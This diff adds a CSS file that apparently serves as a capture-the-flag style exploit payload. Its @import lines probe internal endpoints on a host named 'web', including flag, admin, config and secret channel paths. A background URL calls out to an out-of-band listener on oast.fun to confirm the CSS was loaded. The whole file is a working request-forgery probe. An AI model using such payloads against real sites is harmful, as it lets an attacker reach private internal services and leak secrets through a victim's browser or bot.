@@ -1,0 +1,14 @@
+/* Probe internal endpoints via CSS @import */
+@import url("http://web/");
+@import url("http://web/flag");
+@import url("http://web/api/flag");
+@import url("http://web/admin");
+@import url("http://web/api/admin");  
+@import url("http://web/api/reports");
+@import url("http://web/api/config");
+@import url("http://web/api/channels/0/load");
+@import url("http://web/api/channels/11/load");
+@import url("http://web/api/channels/secret/load");
+
+/* Confirm this CSS loaded */
+body { background: url("http://probe-css-loaded.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/") !important; }
